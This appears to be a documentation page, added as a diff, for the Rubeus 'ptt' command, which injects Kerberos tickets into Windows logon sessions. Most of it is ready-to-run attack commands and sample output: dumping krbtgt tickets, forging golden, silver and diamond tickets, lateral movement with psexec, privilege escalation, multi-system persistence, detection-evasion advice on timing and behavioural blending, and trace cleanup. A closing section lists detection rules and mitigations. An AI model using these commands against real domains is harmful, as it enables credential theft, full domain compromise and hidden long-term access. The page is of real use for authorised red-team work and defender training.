@@ -1,0 +1,868 @@
+---
+title: 'ptt'
+description: 'Pass-the-ticket: inject Kerberos tickets into the current session'
+icon: 'arrow-right-to-bracket'
+sidebarTitle: 'ptt'
+---
+
+<Info>
+**Pass-the-Ticket (PTT)** is a fundamental technique for credential reuse in Kerberos environments, enabling the use of extracted or forged tickets without requiring password knowledge.
+</Info>
+
+## Overview
+
+Pass-the-ticket (PTT) injects Kerberos tickets into logon sessions, enabling authentication to services using previously extracted or forged tickets. This technique bypasses traditional password-based authentication and is essential for lateral movement and privilege escalation.
+
+<CardGroup cols={3}>
+  <Card title="Credential Reuse" icon="recycle">
+    Use extracted tickets without passwords
+  </Card>
+  <Card title="Session Targeting" icon="crosshairs">
+    Inject into current or specific sessions
+  </Card>
+  <Card title="Stealth Operations" icon="user-secret">
+    Authenticate without triggering logon events
+  </Card>
+</CardGroup>
+
+## Injection Process
+
+<Steps>
+  <Step title="Ticket Validation">
+    Verify ticket format and integrity before injection
+  </Step>
+  <Step title="Session Access">
+    Access target logon session (current or specified LUID)
+  </Step>
+  <Step title="LSA Interaction">
+    Interface with Local Security Authority for ticket storage
+  </Step>
+  <Step title="Cache Update">
+    Store ticket in session credential cache
+  </Step>
+  <Step title="Authentication Ready">
+    Ticket becomes available for service authentication
+  </Step>
+</Steps>
+
+## Syntax Variations
+
+<Tabs>
+  <Tab title="Basic Usage">
+    <CodeGroup>
+    ```bash File-based Injection
+    # Inject ticket from .kirbi file
+    Rubeus.exe ptt /ticket:C:\temp\admin.kirbi
+
+    # Inject with relative path
+    Rubeus.exe ptt /ticket:tickets\domain_admin.kirbi
+
+    # Inject multiple tickets
+    Rubeus.exe ptt /ticket:ticket1.kirbi
+    Rubeus.exe ptt /ticket:ticket2.kirbi
+    ```
+
+    ```bash Base64 Injection
+    # Inject from base64 data
+    Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIE...
+
+    # Inject long base64 (from file or clipboard)
+    Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEujCCBLahggS2MIIEsqADAgEFoQwbCkNPUlAuTE9DQUyhHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggR9...
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Session Targeting">
+    <CodeGroup>
+    ```bash Current Session
+    # Inject into current user session (default)
+    Rubeus.exe ptt /ticket:user_ticket.kirbi
+
+    # Verify injection success
+    Rubeus.exe klist
+    ```
+
+    ```bash Specific LUID Targeting
+    # Inject into specific session (requires elevation)
+    Rubeus.exe ptt /ticket:admin.kirbi /luid:0x54321
+
+    # Inject into SYSTEM session
+    Rubeus.exe ptt /ticket:machine.kirbi /luid:0x3e7
+
+    # Inject into service account session
+    Rubeus.exe ptt /ticket:service.kirbi /luid:0x12345
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Workflow Integration">
+    <CodeGroup>
+    ```bash Extraction and Injection
+    # Extract from one system
+    Rubeus.exe dump /service:krbtgt /outfile:extracted.kirbi
+
+    # Inject on another system
+    Rubeus.exe ptt /ticket:extracted.kirbi
+
+    # Verify and use
+    Rubeus.exe klist
+    dir \\target.corp.local\c$
+    ```
+
+    ```bash Forgery and Injection
+    # Create golden ticket
+    Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /outfile:golden.kirbi
+
+    # Inject golden ticket
+    Rubeus.exe ptt /ticket:golden.kirbi
+
+    # Test domain access
+    Rubeus.exe asktgs /service:cifs/fileserver.corp.local
+    ```
+    </CodeGroup>
+  </Tab>
+</Tabs>
+
+## Required Parameters
+
+<ParamField path="ticket" type="string" required>
+  Kerberos ticket to inject into the session
+  <Expandable title="Supported Formats">
+    - **File Path**: Path to .kirbi file (absolute or relative)
+    - **Base64**: Base64-encoded ticket data
+    - **Formats**: Both TGT and TGS tickets supported
+  </Expandable>
+</ParamField>
+
+## Optional Parameters
+
+<Expandable title="Session Targeting" icon="crosshairs" defaultOpen>
+  <ParamField path="luid" type="string">
+    Target specific logon session ID (requires elevation)
+    <Tooltip tip="LUID format: 0x12345 (hexadecimal)">
+      Use logonsession command to enumerate available LUIDs
+    </Tooltip>
+    <Expandable title="Common LUID Values">
+      - **0x3e7**: SYSTEM session (999 in decimal)
+      - **0x3e4**: LOCAL SERVICE session
+      - **0x3e5**: NETWORK SERVICE session
+      - **Higher values**: User logon sessions
+    </Expandable>
+  </ParamField>
+</Expandable>
+
+## Ticket Types and Sources
+
+<Tabs>
+  <Tab title="Ticket Granting Tickets (TGTs)">
+    <Expandable title="TGT Characteristics" defaultOpen>
+      **Properties:**
+      - Provide access to request service tickets
+      - Enable broad authentication capabilities
+      - Typically have longer validity periods
+      - Foundation for all service access
+
+      **Sources:**
+      - Extracted from compromised systems
+      - Forged golden tickets
+      - Renewed expired tickets
+      - Delegation-based extraction
+    </Expandable>
+
+    <CodeGroup>
+    ```bash TGT Injection Examples
+    # Inject extracted TGT
+    Rubeus.exe ptt /ticket:extracted_tgt.kirbi
+
+    # Inject forged golden ticket
+    Rubeus.exe ptt /ticket:golden_ticket.kirbi
+
+    # Test TGT functionality
+    Rubeus.exe asktgs /service:cifs/fileserver.corp.local /ptt
+    ```
+    </CodeGroup>
+
+    <Info>
+      TGTs provide the most flexibility as they can be used to request any service ticket within their privilege scope.
+    </Info>
+  </Tab>
+
+  <Tab title="Service Tickets (TGS)">
+    <Expandable title="Service Ticket Characteristics" defaultOpen>
+      **Properties:**
+      - Provide access to specific services only
+      - Limited scope but immediate usability
+      - Typically shorter validity periods
+      - Service-specific permissions
+
+      **Common Service Types:**
+      - **CIFS**: File system access
+      - **HOST**: Administrative access
+      - **LDAP**: Directory service access
+      - **HTTP**: Web application access
+      - **MSSQL**: Database access
+    </Expandable>
+
+    <CodeGroup>
+    ```bash Service Ticket Examples
+    # Inject CIFS service ticket
+    Rubeus.exe ptt /ticket:cifs_ticket.kirbi
+
+    # Test file access immediately
+    dir \\fileserver.corp.local\share
+
+    # Inject HOST ticket for admin access
+    Rubeus.exe ptt /ticket:host_ticket.kirbi
+    psexec \\target.corp.local cmd
+    ```
+    </CodeGroup>
+
+    <Note>
+      Service tickets provide immediate access to specific services but cannot be used to request additional tickets.
+    </Note>
+  </Tab>
+
+  <Tab title="Forged Tickets">
+    <Expandable title="Golden Tickets" defaultOpen>
+      **Characteristics:**
+      - Domain-wide TGTs forged with KRBTGT hash
+      - Provide complete domain access
+      - Long validity periods (up to 10 years)
+      - Appear legitimate to domain controllers
+
+      ```bash
+      # Create and inject golden ticket
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /outfile:golden.kirbi
+      Rubeus.exe ptt /ticket:golden.kirbi
+      ```
+    </Expandable>
+
+    <Expandable title="Silver Tickets">
+      **Characteristics:**
+      - Service-specific tickets forged with service hash
+      - Limited to specific service access
+      - Bypass domain controller validation
+      - Useful for targeted attacks
+
+      ```bash
+      # Create and inject silver ticket
+      Rubeus.exe silver /user:admin /service:cifs/fileserver.corp.local /rc4:service_hash /outfile:silver.kirbi
+      Rubeus.exe ptt /ticket:silver.kirbi
+      ```
+    </Expandable>
+
+    <Expandable title="Diamond Tickets">
+      **Characteristics:**
+      - Hybrid approach combining legitimate and forged elements
+      - Enhanced stealth capabilities
+      - Use real authentication with privilege modifications
+      - Most sophisticated forgery technique
+
+      ```bash
+      # Create and inject diamond ticket
+      Rubeus.exe diamond /user:user /password:pass /krbkey:krbtgt_key /groups:512 /outfile:diamond.kirbi
+      Rubeus.exe ptt /ticket:diamond.kirbi
+      ```
+    </Expandable>
+  </Tab>
+</Tabs>
+
+## Session Management
+
+<Tabs>
+  <Tab title="Current Session Operations">
+    <Expandable title="Default Behavior" defaultOpen>
+      **Standard Operation:**
+      - Injects ticket into current user's logon session
+      - Requires no special privileges
+      - Limited to current user context
+      - Most common usage scenario
+
+      ```bash
+      # Basic injection into current session
+      Rubeus.exe ptt /ticket:user_ticket.kirbi
+
+      # Verify injection
+      Rubeus.exe klist
+
+      # Test access
+      dir \\target.corp.local\share
+      ```
+    </Expandable>
+
+    <Expandable title="Use Cases">
+      **Typical Scenarios:**
+      - Standard credential reuse
+      - User-context lateral movement
+      - Service access with current privileges
+      - Testing extracted credentials
+    </Expandable>
+  </Tab>
+
+  <Tab title="Cross-Session Operations">
+    <Expandable title="LUID Targeting" defaultOpen>
+      **Elevated Requirements:**
+      - Requires administrative privileges
+      - Can target any logon session on system
+      - Enables cross-user ticket injection
+      - Advanced persistence techniques
+
+      ```bash
+      # Enumerate available sessions
+      Rubeus.exe logonsession
+
+      # Inject into specific session
+      Rubeus.exe ptt /ticket:admin.kirbi /luid:0x54321
+
+      # Verify injection in target session
+      Rubeus.exe klist /luid:0x54321
+      ```
+    </Expandable>
+
+    <Expandable title="Strategic Applications">
+      **Advanced Use Cases:**
+      - Inject into service account sessions
+      - Target administrative sessions
+      - Cross-user authentication
+      - System-wide credential distribution
+    </Expandable>
+  </Tab>
+
+  <Tab title="SYSTEM Session Access">
+    <Expandable title="Machine Account Operations" defaultOpen>
+      **SYSTEM Session (LUID 0x3e7):**
+      - Machine account context
+      - Highest privilege level
+      - Used for computer authentication
+      - Critical for domain operations
+
+      ```bash
+      # Inject machine account ticket
+      Rubeus.exe ptt /ticket:machine_tgt.kirbi /luid:0x3e7
+
+      # Test machine account access
+      Rubeus.exe asktgs /service:ldap/dc01.corp.local
+      ```
+    </Expandable>
+
+    <Expandable title="Machine Account Benefits">
+      **Capabilities:**
+      - Domain controller communication
+      - Machine-level authentication
+      - Cross-domain trust operations
+      - Administrative service access
+    </Expandable>
+  </Tab>
+</Tabs>
+
+## Response Format
+
+<Tabs>
+  <Tab title="Successful Injection">
+    ```bash
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+
+    [*] PAC Validation: SUCCESS
+    [*] Ticket Type: Service Ticket
+    [*] Target LUID: 0x12345
+    [*] Username: admin@CORP.LOCAL
+    [*] Domain: CORP.LOCAL
+    [*] LogonId: 0x12345
+    ```
+
+    <ResponseField name="Import Status" type="string">
+      Confirmation that ticket was successfully imported
+    </ResponseField>
+
+    <ResponseField name="PAC Validation" type="string">
+      Validation status of Privilege Attribute Certificate
+      <Expandable title="PAC Validation Results">
+        - **SUCCESS**: PAC validated correctly
+        - **WARNING**: PAC validation issues (but still imported)
+        - **FAILED**: PAC validation failed (ticket may not work)
+      </Expandable>
+    </ResponseField>
+
+    <ResponseField name="Ticket Information" type="object">
+      Details about the imported ticket
+      <Expandable title="Ticket Details">
+        - **Ticket Type**: TGT or Service Ticket
+        - **Target LUID**: Destination logon session
+        - **Username**: Principal name from ticket
+        - **Domain**: Authentication domain
+      </Expandable>
+    </ResponseField>
+  </Tab>
+
+  <Tab title="Injection Warnings">
+    ```bash
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+
+    [!] WARNING: PAC validation failed for the ticket
+    [!] This may indicate a forged or corrupted ticket
+    [!] Authentication may fail for some services
+
+    [*] Target LUID: 0x54321
+    [*] Username: admin@CORP.LOCAL
+    ```
+
+    <Warning>
+      PAC validation warnings may indicate:
+      - Forged tickets with invalid signatures
+      - Expired or corrupted tickets
+      - Cross-domain trust issues
+      - Service-specific validation problems
+    </Warning>
+  </Tab>
+
+  <Tab title="Error Scenarios">
+    ```bash
+    [!] Unhandled Rubeus exception:
+
+    System.ComponentModel.Win32Exception: Access is denied
+       at Rubeus.LSA.ImportTicket(Byte[] ticket, UInt64 targetLuid)
+
+    [!] Unable to import ticket - check LUID and privileges
+    [!] Cross-session injection requires administrative privileges
+    ```
+
+    <Warning>
+      Common error scenarios:
+      - **Access denied**: Insufficient privileges for target LUID
+      - **Invalid LUID**: Specified session doesn't exist
+      - **Corrupted ticket**: Invalid ticket format or data
+      - **Anti-malware**: Security software blocking injection
+    </Warning>
+  </Tab>
+</Tabs>
+
+## Complete Integration Workflows
+
+<Steps>
+  <Step title="Ticket Acquisition">
+    Obtain tickets through various methods:
+
+    <CodeGroup>
+    ```bash Extraction Methods
+    # Extract from current system
+    Rubeus.exe dump /service:krbtgt /outfile:extracted.kirbi
+
+    # Extract via delegation
+    Rubeus.exe tgtdeleg /outfile:delegated.kirbi
+
+    # Monitor for new tickets
+    Rubeus.exe monitor /filteruser:admin
+    ```
+
+    ```bash Forgery Methods
+    # Create golden ticket
+    Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /outfile:golden.kirbi
+
+    # Create silver ticket
+    Rubeus.exe silver /user:admin /service:cifs/target.corp.local /rc4:service_hash /outfile:silver.kirbi
+    ```
+    </CodeGroup>
+  </Step>
+
+  <Step title="Ticket Injection">
+    Inject acquired tickets into appropriate sessions:
+
+    ```bash
+    # Inject into current session
+    Rubeus.exe ptt /ticket:acquired_ticket.kirbi
+
+    # Inject into specific session (if elevated)
+    Rubeus.exe ptt /ticket:admin_ticket.kirbi /luid:0x54321
+    ```
+  </Step>
+
+  <Step title="Verification">
+    Verify successful injection and test functionality:
+
+    ```bash
+    # List current tickets
+    Rubeus.exe klist
+
+    # Describe injected ticket
+    Rubeus.exe describe /ticket:injected_ticket.kirbi
+
+    # Test service access
+    dir \\target.corp.local\c$
+    ```
+  </Step>
+
+  <Step title="Service Usage">
+    Use injected tickets for authentication:
+
+    ```bash
+    # Access file shares
+    dir \\fileserver.corp.local\share
+
+    # Request additional service tickets
+    Rubeus.exe asktgs /service:http/webapp.corp.local
+
+    # Perform administrative tasks
+    psexec \\target.corp.local cmd
+    ```
+  </Step>
+
+  <Step title="Operational Cleanup">
+    Clean up traces when operations complete:
+
+    ```bash
+    # Purge injected tickets
+    Rubeus.exe purge
+
+    # Verify cleanup
+    Rubeus.exe klist
+
+    # Remove ticket files
+    del *.kirbi
+    ```
+  </Step>
+</Steps>
+
+## Advanced Usage Scenarios
+
+<Tabs>
+  <Tab title="Lateral Movement">
+    <Expandable title="Cross-System Authentication" defaultOpen>
+      ```bash
+      # Extract TGT from System A
+      Rubeus.exe dump /service:krbtgt /outfile:admin_tgt.kirbi
+
+      # Transfer to System B and inject
+      Rubeus.exe ptt /ticket:admin_tgt.kirbi
+
+      # Access resources from System B
+      Rubeus.exe asktgs /service:cifs/fileserver.corp.local
+      dir \\fileserver.corp.local\admin_share
+      ```
+    </Expandable>
+
+    <Expandable title="Multi-Hop Operations">
+      ```bash
+      # Hop 1: Initial system with user credentials
+      Rubeus.exe asktgt /user:user /password:pass /ptt
+
+      # Extract for transfer
+      Rubeus.exe dump /service:krbtgt /outfile:user_tgt.kirbi
+
+      # Hop 2: Intermediate system
+      Rubeus.exe ptt /ticket:user_tgt.kirbi
+      Rubeus.exe kerberoast /outfile:service_hashes.txt
+
+      # Hop 3: Final target with cracked service account
+      Rubeus.exe asktgt /user:svc_sql /password:cracked_pass /ptt
+      ```
+    </Expandable>
+  </Tab>
+
+  <Tab title="Privilege Escalation">
+    <Expandable title="Session Hijacking" defaultOpen>
+      ```bash
+      # Enumerate sessions for high-privilege accounts
+      Rubeus.exe logonsession
+
+      # Extract tickets from administrative sessions
+      Rubeus.exe dump /luid:0x54321 /service:krbtgt /outfile:admin_tgt.kirbi
+
+      # Inject into current session for privilege escalation
+      Rubeus.exe ptt /ticket:admin_tgt.kirbi
+
+      # Test elevated access
+      dir \\dc01.corp.local\c$
+      ```
+    </Expandable>
+
+    <Expandable title="Service Account Escalation">
+      ```bash
+      # Start with limited service account
+      Rubeus.exe ptt /ticket:service_ticket.kirbi
+
+      # Use delegation rights for escalation
+      Rubeus.exe s4u /ticket:service_ticket.kirbi /impersonateuser:admin /msdsspn:cifs/target.corp.local /ptt
+
+      # Access target with elevated privileges
+      dir \\target.corp.local\c$
+      ```
+    </Expandable>
+  </Tab>
+
+  <Tab title="Persistence Operations">
+    <Expandable title="Golden Ticket Deployment" defaultOpen>
+      ```bash
+      # Create multiple golden tickets for redundancy
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /outfile:admin_golden.kirbi
+      Rubeus.exe golden /user:backup_admin /rc4:krbtgt_hash /ldap /outfile:backup_golden.kirbi
+
+      # Deploy across multiple systems
+      # System 1
+      Rubeus.exe ptt /ticket:admin_golden.kirbi
+
+      # System 2
+      Rubeus.exe ptt /ticket:backup_golden.kirbi
+
+      # Test persistent access
+      Rubeus.exe asktgs /service:cifs/fileserver.corp.local
+      ```
+    </Expandable>
+
+    <Expandable title="Service-Specific Persistence">
+      ```bash
+      # Create silver tickets for specific services
+      Rubeus.exe silver /user:admin /service:cifs/fileserver.corp.local /rc4:service_hash /outfile:file_silver.kirbi
+      Rubeus.exe silver /user:admin /service:mssql/sqlserver.corp.local /rc4:sql_hash /outfile:sql_silver.kirbi
+
+      # Deploy service-specific access
+      Rubeus.exe ptt /ticket:file_silver.kirbi
+      Rubeus.exe ptt /ticket:sql_silver.kirbi
+      ```
+    </Expandable>
+  </Tab>
+</Tabs>
+
+## OPSEC Considerations
+
+<Warning>
+**Detection Risk**: Ticket injection can be monitored through various host-based and behavioral detection methods.
+</Warning>
+
+<Tabs>
+  <Tab title="Detection Vectors">
+    <Expandable title="Host-Based Detection" defaultOpen>
+      **Process Monitoring:**
+      - Non-lsass.exe processes accessing LSA authentication packages
+      - Use of sensitive APIs like LsaCallAuthenticationPackage()
+      - Memory access patterns consistent with ticket injection
+      - Process behavior analysis for credential manipulation
+
+      **API Call Monitoring:**
+      - Unusual LSA function calls
+      - Authentication package interactions
+      - Memory access to LSASS process
+      - System call patterns for ticket injection
+    </Expandable>
+
+    <Expandable title="Behavioral Analysis">
+      **Authentication Patterns:**
+      - Service access without corresponding authentication events
+      - Unusual timing between authentication and resource access
+      - Access to resources not typically used by the account
+      - Cross-session authentication activities
+
+      **Privilege Anomalies:**
+      - Low-privilege accounts accessing high-privilege resources
+      - Service accounts performing interactive operations
+      - Authentication outside normal business hours
+      - Geographic or network location anomalies
+    </Expandable>
+
+    <Expandable title="Event Log Analysis">
+      **Windows Event Logs:**
+      - Missing expected logon events (4624)
+      - Service access without TGT requests
+      - Unusual authentication package usage
+      - Cross-LUID operations requiring elevation
+
+      **Kerberos Event Monitoring:**
+      - TGS usage without corresponding TGT acquisition
+      - Unusual encryption types or ticket characteristics
+      - Service access patterns inconsistent with user behavior
+    </Expandable>
+  </Tab>
+
+  <Tab title="Evasion Techniques">
+    <Expandable title="Timing Considerations" defaultOpen>
+      ```bash
+      # Inject tickets during business hours
+      # Schedule: 9:00 AM - 5:00 PM business hours
+
+      # Use realistic timing between injection and usage
+      Rubeus.exe ptt /ticket:admin.kirbi
+      # Wait 2-5 minutes before first access
+      dir \\target.corp.local\share
+      ```
+    </Expandable>
+
+    <Expandable title="Behavioral Blending">
+      ```bash
+      # Use tickets consistent with user's normal activities
+      Rubeus.exe ptt /ticket:user_appropriate_ticket.kirbi
+
+      # Access resources the user normally accesses
+      dir \\fileserver.corp.local\user_documents
+
+      # Avoid obviously administrative actions immediately after injection
+      # Wait for normal business activities before escalating
+      ```
+    </Expandable>
+
+    <Expandable title="Technical Evasion">
+      ```bash
+      # Use current session when possible (avoid LUID targeting)
+      Rubeus.exe ptt /ticket:ticket.kirbi
+
+      # Prefer legitimate extracted tickets over forged ones
+      # Extracted tickets have better chance of passing validation
+
+      # Use service-specific tickets rather than broad TGTs when possible
+      Rubeus.exe ptt /ticket:specific_service.kirbi
+      ```
+    </Expandable>
+  </Tab>
+
+  <Tab title="Defensive Countermeasures">
+    <Expandable title="Detection Implementation">
+      **Host-Based Monitoring:**
+      - Monitor LSA authentication package interactions
+      - Implement process behavior analysis
+      - Track memory access to LSASS process
+      - Alert on unusual API call patterns
+
+      **Sysmon Configuration:**
+      ```xml
+      <!-- Monitor process access to LSASS -->
+      <ProcessAccess onmatch="include">
+        <TargetImage>lsass.exe</TargetImage>
+        <GrantedAccess>0x1fffff</GrantedAccess>
+      </ProcessAccess>
+      ```
+    </Expandable>
+
+    <Expandable title="Behavioral Analysis">
+      **SIEM Rules:**
+      ```sql
+      -- Detect authentication without logon
+      SELECT * FROM events
+      WHERE service_access = true
+      AND logon_event = false
+      AND time_diff < 5_minutes
+
+      -- Unusual cross-session activities
+      SELECT * FROM events
+      WHERE elevated_privileges = true
+      AND process_owner != session_owner
+      ```
+    </Expandable>
+
+    <Expandable title="Mitigation Strategies">
+      **Technical Controls:**
+      - Implement Credential Guard
+      - Use Protected Process Light (PPL) for LSASS
+      - Deploy endpoint detection and response (EDR)
+      - Enable advanced threat protection
+
+      **Administrative Controls:**
+      - Regular credential rotation
+      - Privileged access management (PAM)
+      - Least privilege access principles
+      - Regular security assessment and monitoring
+    </Expandable>
+  </Tab>
+</Tabs>
+
+## Troubleshooting
+
+<Expandable title="Common Issues" icon="exclamation-triangle">
+  <Tabs>
+    <Tab title="Access Denied Errors">
+      **Problem**: Cannot inject into specific LUID
+
+      **Solutions**:
+      - Verify current user has administrative privileges
+      - Check if target LUID exists and is accessible
+      - Try injecting into current session instead
+      - Verify anti-malware isn't blocking injection
+
+      ```bash
+      # Check current privileges
+      whoami /priv
+
+      # Enumerate available sessions
+      Rubeus.exe logonsession
+
+      # Try current session injection
+      Rubeus.exe ptt /ticket:ticket.kirbi
+      ```
+    </Tab>
+
+    <Tab title="Ticket Format Issues">
+      **Problem**: Invalid ticket format or corruption
+
+      **Solutions**:
+      - Verify ticket file integrity
+      - Check base64 encoding for completeness
+      - Ensure ticket hasn't expired
+      - Try extracting ticket again from source
+
+      ```bash
+      # Describe ticket to check validity
+      Rubeus.exe describe /ticket:suspect_ticket.kirbi
+
+      # Check file size and contents
+      dir ticket.kirbi
+
+      # Try different ticket format
+      Rubeus.exe ptt /ticket:base64_encoded_ticket_data
+      ```
+    </Tab>
+
+    <Tab title="Authentication Failures">
+      **Problem**: Injected ticket doesn't provide expected access
+
+      **Solutions**:
+      - Verify ticket was injected successfully
+      - Check ticket permissions and group memberships
+      - Ensure target services are accessible
+      - Verify ticket hasn't expired
+
+      ```bash
+      # Verify injection success
+      Rubeus.exe klist
+
+      # Check ticket contents
+      Rubeus.exe describe /ticket:injected_ticket.kirbi
+
+      # Test with known working service
+      dir \\known_accessible_share
+      ```
+    </Tab>
+  </Tabs>
+</Expandable>
+
+## Integration with Other Commands
+
+<CardGroup cols={2}>
+  <Card title="Ticket Extraction" icon="download">
+    Use dump, tgtdeleg, or monitor to obtain tickets for injection
+  </Card>
+  <Card title="Ticket Forgery" icon="magic-wand-sparkles">
+    Inject golden, silver, or diamond tickets after creation
+  </Card>
+  <Card title="Session Management" icon="users">
+    Combine with logonsession and currentluid for session targeting
+  </Card>
+  <Card title="Access Validation" icon="check">
+    Use klist and describe to verify injection and ticket properties
+  </Card>
+</CardGroup>
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="klist" icon="list" href="/ghostpack-docs/Rubeus-mdx/commands/extraction/klist">
+    List tickets in current or specified session
+  </Card>
+  <Card title="dump" icon="download" href="/ghostpack-docs/Rubeus-mdx/commands/extraction/dump">
+    Extract tickets for use with PTT
+  </Card>
+  <Card title="describe" icon="magnifying-glass" href="/ghostpack-docs/Rubeus-mdx/commands/management/describe">
+    Analyze ticket contents before injection
+  </Card>
+  <Card title="purge" icon="trash" href="/ghostpack-docs/Rubeus-mdx/commands/management/purge">
+    Clear injected tickets from session
+  </Card>
+</CardGroup>
